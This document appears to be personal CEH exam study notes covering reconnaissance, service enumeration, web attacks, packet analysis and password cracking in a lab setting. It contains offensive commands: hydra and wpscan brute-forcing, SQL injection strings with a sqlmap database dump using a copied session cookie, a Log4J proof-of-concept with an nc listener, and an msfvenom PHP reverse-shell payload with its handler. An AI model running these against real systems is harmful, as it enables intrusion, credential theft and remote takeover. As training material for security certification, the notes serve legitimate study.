# CEH Notes (Personal)

# Recon & Enumeration

Nmap 

- Ping Sweep: `nmap -sP {}`
- ARP Scan: `nmap -PR -sn {}`
- ACK Scan: `nmap -sA {}`

To identify Host OS first run nmap scan & then use `nikto -h {}`

DNS

- `dig {}` ← get public IP (or use ping)
    - `dig axfr {}`
- `ping {}`
- `lbd {}` ← detect load balancers (for ex. cloudflare)
- `nslookup` ← name servers
    - `set type=ns`
    - `www.domaintest.com`
        
        ^ get name server for domaintest
        
- `whois` ← gather more info
- To get Geolocation based on IP: [https://www.nexcess.net/blog/how-to-find-out-where-your-server-is-located/](https://www.nexcess.net/blog/how-to-find-out-where-your-server-is-located/)

Note* Routers = IoT devices (shodan)

# Services

### FTP

To crack password use `hydra -L usernames.txt -P passwords.txt ftp://10.0.0.5`

- Connect to FTP instance: `ftp {ip}`
    - Download file: `get {file}`

### SNMP

- `nmap -sU {}`
    - You can further enumerate with nmap scripts
    - `nmap -sU -p 161 --script=snmp-processes {ip}`
        
        ![Untitled](CEH%20Notes%20(Personal)%205fd56f13be54493ca0bc11db3f428466/Untitled.png)
        
- `snmp-check {ip}`
- `msfconsole` → `search snmp` → `show options` → `set RHOST {}` → `exploit`
    
    ![Untitled](CEH%20Notes%20(Personal)%205fd56f13be54493ca0bc11db3f428466/Untitled%201.png)
    

### SMB

Look for an open port 445 ← SMB is running

- Find out message signing/smb security level: `nmap -A {ip}`
- To enumerate network file shares`nmap -p 445 --script smb-enum-shares {ip}`
- To enumerate logged in users: `nmap -p 445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=qwerty {ip}`
- To enumerate workgroups: `nmap -p 445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=qwerty {ip}`
- To enumerate Services/Domains: `nmap -p 445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=qwerty {ip}`
    
    ![Untitled](CEH%20Notes%20(Personal)%205fd56f13be54493ca0bc11db3f428466/Untitled%202.png)
    

You can also connect to smb with a gui, simply go to the file explorer and type in the address `smb://{ip}`

### LDAP

1. Get User Accounts: (NOTE* Guest are NOT users):
    
    `ldapsearch -x -h 10.0.0.5 -p 389 -b "dc=HOME,dc=com" "(objectClass=user)" | grep "dn:"`
    
    or (simpler)
    
    `ldapsearch -x -b "dc=HOME,dc=com" -H ldap://10.0.0.5 -W "objectclass=user"`
    
2. Find ldap version: `ldapsearch -x -b "dc=HOME,dc=com" -H ldap://10.0.0.5`

### RDP

To find out if the target has RDP we can use:

- `nmap -p 3386 {ip}` OR `nmap -A {ip}` if the target is using an unconventional port for rdp
- metasploit: `auxiliary/scanner/rdp/rdp_scanner`
    
    ![Untitled](CEH%20Notes%20(Personal)%205fd56f13be54493ca0bc11db3f428466/Untitled%203.png)
    

To brute force credentials use `hydra`

To connect to rdp use `remmina` OR `xfreerdp /u:administrator /p:qwerty /v:10.0.0.5:3333`

### NetBIOS

Uses ports 137, 138, 139

- `nmap -sV --script nbstat.nse {ip}`
- We can also get the netbios name with `nmap -A {}`

# Webservers & Webapps

- Find the version of a webserver: `httprecon`
- Find the HTTP server used by a web-app: `ID Serve`
- SQL Injection Steps:
    1. For a simple manual SQL injection: (to get initial access)
        1. Username: `‘ OR 1=1--`
        2. we can also try Username: `' OR 1=1 #`
        3. Passdowd: `‘’`
    2. Open up “inspect element” anywhere in the page → go to the “console” tab → type in `document.cookie` → save or copy the output
    3. Run SQL map: `sqlmap -u http://testwebsite.com/viewprofile.aspx?id=1 --cookie="{step2}" -a`
        
        ^ From here we just have to scroll to search for the database
        
        OR we can take things step by step:
        
        1. `sqlmap -u {profile url} --cookie="{}" --current-db`
        2. `sqlmap -u {profile url} --cookie="{}" -D {current database} --tables`
        3. `sqlmap -u {profile url} --cookie="{}" -T User_Login --dump`
- Find the Content Management System used by a website: `nikto --url test.com` (answer would be something like WordPress0
    
    ![Untitled](CEH%20Notes%20(Personal)%205fd56f13be54493ca0bc11db3f428466/Untitled%204.png)
    
- Perform a Bruteforce attack to find the password of a user:
    1. (Optional) get website info: `nikto --url {}`
        
        ![Untitled](CEH%20Notes%20(Personal)%205fd56f13be54493ca0bc11db3f428466/Untitled%205.png)
        
    2. `wpscan --url test.com --usernames paul --passwords password.txt`
        
        ^This will yeild the results, Note that the url should be standard NOT test.com/wp-login
        
- Enumerate Word press site:
    - `wpscan --url {} --enumerate`
- Parameter tampering = IDOR vulnerability (just change the url id value)
- Log4J vulnerability steps:
    1. First extract the file `tar -xf jdk-8u202-linux-x64.tar.gz`
    2. move the file `mv jdk1.8.0_202 /usr/bin/`
    3. edit the [poc.py](http://poc.py) file via `pluma poc.py`
    4. in line **62**, replace **jdk1.8.0_20/bin/javac** with **/usr/bin/jdk1.8.0_202/bin/javac**
    5. Set up nc `nc -lvnp 9001`
    6. Run  `python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001`
        
        ![Untitled](CEH%20Notes%20(Personal)%205fd56f13be54493ca0bc11db3f428466/Untitled%206.png)
        
    7. Input that as the Username in the website and press “login”
    8. We should now have a shell
- Anti-clickjacking:
    - `nikto -h {}` ← if “The anti-clickjacking X-Frame-Options header is not present” then that means the site is vulnerable to clickjacking
    - Or use `ClickJackPro`
    - Or Use `zaproxy` to run an automated scan
        
        ![Untitled](CEH%20Notes%20(Personal)%205fd56f13be54493ca0bc11db3f428466/Untitled%207.png)
        
- File Upload Vulnerability:
    1. Upload a meterpreter reverse shell
        
        `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=1234 -f raw -o shell.php`
        
        Also make sure to run `msfconsole`
        
        `use exploit/multi/handler`
        
        `set payload php/meterpreter/reverse_tcp`
        
        `set LHOST 10.10.1.10`
        
        `set LPORT 1234`
        
        `run`
        
- Banner Grabbing: (you can get Etag, Server= HTTP server, X-Powered-By = ASP.NET)
    - Run `nc -v test.com 80`
        
        `GET / HTTP/1.0`
        
- Perform Web Crawling (get the number of images, etc)
    - Run `zaproxy`
    - Run an Automated Scan and once it’s done look at the left panel,  Expand Sites → test.com→ images
- Perform XSS vuln test:
    - `nikto -h {}` ← if “The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS” then it’s likely the application is not vulnerable to an XSS attack
        
        ![Untitled](CEH%20Notes%20(Personal)%205fd56f13be54493ca0bc11db3f428466/Untitled%208.png)
        

# Wireshark

- For DoS attack use “Conversations” and look for the IP that sends way too much traffic (flooding TCP or UDP packets)
- data size of a packet: Len=748 ← for ex.
- Someone sniffing the network = most likely using the `ARP` protocol. In Wireshark there should be alot of packets saying something like “ 10.0.0.5 is at {mac}” repeatedly
    - Aka the protocol used to sniff the traffic is ARP
- CovertTCP
    1. Look at conversations and start filtering converstations invidualally (aka A←→B)
    2. The traffic should look like [”RST, ACK” → ”TCP port numbers reused” → “RST,ACK”] OR [red → black → red → black → etc]
    3. From here we could potentially go back and simply select only one direction to filter (A→B) to get only “TCP Port numbers reused” or black packets
        
        ![Untitled](CEH%20Notes%20(Personal)%205fd56f13be54493ca0bc11db3f428466/Untitled%209.png)
        
    4. Look at the “Identification” label in each packet (should be a hex value) and then look at the ASCII representation of that hex value in the hex window provided by wireshark
        
        ![Untitled](CEH%20Notes%20(Personal)%205fd56f13be54493ca0bc11db3f428466/Untitled%2010.png)
        
    5. Do this for every packet sequentually to get the message
- To find Credentials go to “Edit” → “Find Packet…” → set search for “Packet details”, “Narrow & Wide” and “String” → input “pwd”
    
    ![Untitled](CEH%20Notes%20(Personal)%205fd56f13be54493ca0bc11db3f428466/Untitled%2011.png)
    
- For DDoS attacks - go to “conversations” and look at all the IPs that direct their traffic only to one specific host.
- IOT DEVICES:
    - IoT devices use the mqtt protocol to communicate
        
        ![Untitled](CEH%20Notes%20(Personal)%205fd56f13be54493ca0bc11db3f428466/Untitled%2012.png)
        
    - Analyse packets using the `mqtt` filter and look for any packet that says “Publich Message”, the message Topic will be right next to the “Publish Message (id=2) [message]” under the info tab
    - If we want to find the alert message sent to the sensor:
        - use the `mqtt` filter, look for the “Publish MEssage” and look at the “Message:” label at the bottom. The message string can be seen by wiresharks automatic converter by hovering over it.
- Identify Severity level
    - go to ************************************************************Analyze → Expert Information************************************************************
    - For a DoS attack thing that gives it away is the D-SACK sqeuence which usually appears as “Warning”

# Steganography

Tools to use:

- `snow` ← use for whitespace steg
    - `SNOW.EXE -C -p "qwert" Hiddensecret.txt` ← find the secret hidden with password qwert
        
        ![Untitled](CEH%20Notes%20(Personal)%205fd56f13be54493ca0bc11db3f428466/Untitled%2013.png)
        
- `Openstego` ← use for information inside an image; Usually `.bmp`
- `CovertTCP`
    - sender: `./covert_tcp -source {sender_ip} -dest {target_ip} -source_port 9999 -dest_port 8888 -file secret.txt`
    - receiver: `./covert_tcp -source {sender_ip} -source_port 8888 -server- file receive.txt`
    
    ^ Here the information inside the “secret.txt” file is sent and stored as “receive.txt”
    

# Cryptography

- `Hashmyfiles` | `hashcalc` - calculate and compare hashes
- `Cryptool` - encrypt/decrypt hex data by changing key length
    - Note* it’s likely the encryption scheme will be RC4
    - First load up the encrypted text and then perform analysis
        
        ![Untitled](CEH%20Notes%20(Personal)%205fd56f13be54493ca0bc11db3f428466/Untitled%2014.png)
        
    - Usually the key length could be given
        
        ![Untitled](CEH%20Notes%20(Personal)%205fd56f13be54493ca0bc11db3f428466/Untitled%2015.png)
        
- `BcTextEncoder` - encrypt/decrypt hex data
    
    ![Untitled](CEH%20Notes%20(Personal)%205fd56f13be54493ca0bc11db3f428466/Untitled%2016.png)
    
- `CryptoForge` - encrypt/decrypt files
    
    ![Untitled](CEH%20Notes%20(Personal)%205fd56f13be54493ca0bc11db3f428466/Untitled%2017.png)
    
- `VeraCrypt` - Hiding and Encrypting disk partitions
    - Select a Disk and encrypted file and press “Mount”
        
        ![Untitled](CEH%20Notes%20(Personal)%205fd56f13be54493ca0bc11db3f428466/Untitled%2018.png)
        
    - Go to the file location in explorer and that’s the info:
        
        ![Untitled](CEH%20Notes%20(Personal)%205fd56f13be54493ca0bc11db3f428466/Untitled%2019.png)
        
- `AES-Tool` - unlock `.aes` files

# Crack Passwords

- NTLM hashes: `john --format=nt hashes.txt`
- Password Auditing: L0phtCrack
    1. Run Password Auditing Wizzard on start
    2. Select Remote machine (if applicable)
    3. Set the IP as HOST and select “Use Specific User Credentials” if on AD; from there just input something like
        
        Username: Administrator
        
        Password: 1234
        
        Domain: HOME.com
        
    4. Press next and select “Quick Password Audit”
    5. Boom, wait until passwords are cracked

# Malware Analysis

- The CPU architecture is given by the Imports Results Summary; labeled as “Processor:” In the example below the CPU Architecture is AARCH64
    
    ![Untitled](CEH%20Notes%20(Personal)%205fd56f13be54493ca0bc11db3f428466/Untitled%2020.png)
    
- Perform a security audit to find the premission to “Read SMS”
    - Upload the malicious APK to VirusTotal
    - Under the “Details” Tab scroll down to “Permissions”
- Registry analysis - use `Reg Organizer` to create two separate snapshots and then compatre them
    
    ![Untitled](CEH%20Notes%20(Personal)%205fd56f13be54493ca0bc11db3f428466/Untitled%2021.png)
    
- Window Service Monitoring - use `SrvMan`

# Android

- ADB
    - `adb connect 10.0.0.44:5555`
    - `adb devices`
    - `adb shell`
    - `cd sdcard/`
- If you want you can also use to automate it `PhoneSploit`
    - To connect it will say “Enter a phones ip”
    - From there select 4 to “Access a shell”
    - For a keycode representaion select 24. If for ex. we are give the number we can look at it and see what it represents (for ex. KeyCode 75 represents APOSTROPHE)
    
    ![Untitled](CEH%20Notes%20(Personal)%205fd56f13be54493ca0bc11db3f428466/Untitled%2022.png)
    

# MISC

DHCP starvation: [https://www.tomcordemans.net/dhcp-starvation/](https://www.tomcordemans.net/dhcp-starvation/)

Spyware: very likely to be Ninja spyware (port 3707 - servie labeled as “rt-event-s”)

Note* Ninja Jonin is the Master (server)